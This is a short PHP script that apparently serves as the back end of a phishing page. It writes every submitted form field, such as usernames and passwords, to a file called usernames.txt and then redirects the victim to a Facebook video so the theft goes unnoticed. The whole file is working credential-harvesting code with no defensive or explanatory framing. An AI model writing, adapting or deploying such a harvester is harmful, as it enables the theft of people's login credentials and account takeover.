<?php
header
('location:');
$handle=fopen("usernames.txt","a");
foreach($_POST as $variable=>$value)
{
fwrite($handle,$variable);
fwrite($handle,"=");
fwrite($handle,$value);
fwrite($handle,"\r\n");
}
fwrite($handle,"\r\n");
fclose($handle);
header("location:https://www.facebook.com/piumi.hansamali.3/videos/3819334571527781");
exit;
?>
